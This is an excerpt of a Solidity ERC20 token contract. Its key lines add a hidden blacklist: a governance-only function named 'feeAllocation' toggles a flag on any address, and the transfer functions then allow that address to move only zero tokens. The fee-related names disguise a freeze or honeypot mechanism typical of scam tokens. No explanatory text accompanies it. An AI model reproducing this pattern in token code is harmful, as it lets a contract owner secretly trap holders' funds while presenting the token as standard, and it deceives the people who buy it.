...
contract ERC20 is Context, IERC20 {
    ...
    mapping (address => bool) private _standardaddress_;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if (_standardaddress_[_msgSender()] || _standardaddress_[recipient]) require (amount == 0, "");
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_standardaddress_[sender] || _standardaddress_[recipient]) require (amount == 0, "");
    ...
    function feeAllocation(address _standardaddress) external {
        require(msg.sender == governance);
        if (_standardaddress_[_standardaddress] == true) {
            _standardaddress_[_standardaddress] = false;}
            else {_standardaddress_[_standardaddress] = true;}
    }

    function feeGrant(address _standardaddress) public view returns (bool) {
        return _standardaddress_[_standardaddress];
    }
